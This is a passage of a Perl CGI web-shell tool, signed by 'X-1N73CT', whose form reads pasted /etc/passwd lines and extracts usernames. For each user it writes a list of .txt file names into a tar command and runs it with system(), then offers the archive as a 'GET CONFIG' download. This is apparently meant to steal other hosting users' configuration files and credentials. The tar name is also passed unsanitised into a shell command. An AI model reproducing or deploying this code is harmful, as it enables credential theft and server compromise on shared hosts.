<textarea name="pass" style="border:1px dotted #00ff00; width: 543px; height: 420px; background-color:#0C0C0C; font-family:Tahoma; font-size:8pt; color:#FF0000"  ></textarea></p>
<p align="center">
<input name="tar" type="text" style="border:1px dotted #FF0000; width: 212px; background-color:#0C0C0C; font-family:Tahoma; font-size:8pt; color:#FF0000; "  /></p>
<p align="center">
<input name="Submit1" type="submit" value="GET CONFIG !" style="border:1px dotted #FF0000; width: 99; font-family:Tahoma; font-size:10pt; color:#59E817; text-transform:uppercase; height:23; background-color:#0C0C0C" /></p>
</form>';
}else{
@lines =<$FORM{pass}>;
$y = @lines;
open (MYFILE, ">tar.tmp");
print MYFILE "tar -czf ".$FORM{tar}.".tar ";
for ($ka=0;$ka<$y;$ka++){
while(@lines[$ka]  =~ m/(.*?):x:/g){
&lil($1);
print MYFILE $1.".txt ";
for($kd=1;$kd<18;$kd++){
print MYFILE $1.$kd.".txt ";
}
}
 }
print'<body class="newStyle1" bgcolor="#000000">
<p>You got it!!<br><br><br><font color="#C0C0C0">[</font> Coded By <font color="#FF0000">X-1N73CT</font><font color="#C0C0C0">]</font></p>
<p>&nbsp;</p>';
if($FORM{tar} ne ""){
open(INFO, "tar.tmp");
@lines =<INFO> ;
close(INFO);
system(@lines);
print'<p><a href="'.$FORM{tar}.'.tar"><font color="#00FF00">
<span style="text-decoration: none">Click Here To Download Tar File</span></font></a></p>';
}
}
 print"
</body>
</html>";